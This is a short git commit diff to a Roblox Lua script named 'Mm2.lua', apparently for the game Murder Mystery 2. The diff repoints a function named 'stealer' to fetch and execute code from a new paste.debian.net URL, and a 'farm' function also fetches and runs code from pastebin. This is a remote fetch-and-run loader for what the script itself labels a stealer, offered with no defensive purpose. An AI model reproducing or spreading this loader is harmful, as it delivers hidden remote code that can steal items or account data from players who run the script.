a3cec458d971781ce3290f6644112fd6a6d19919
RoshiroGaming32 <basiliojerico37@gmail.com>
2025-07-27 16:32:09 +0800

    Update Mm2.lua

--- Mm2.lua
+++ Mm2.lua
@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("https://paste.debian.net/plainh/fd0575b5/", true))()
+    loadstring(game:HttpGet("https://paste.debian.net/plainh/37e7a932/", true))()
 end
 local function farm()
     loadstring(game:HttpGet("https://pastebin.com/raw/Ea2fXndi"))()
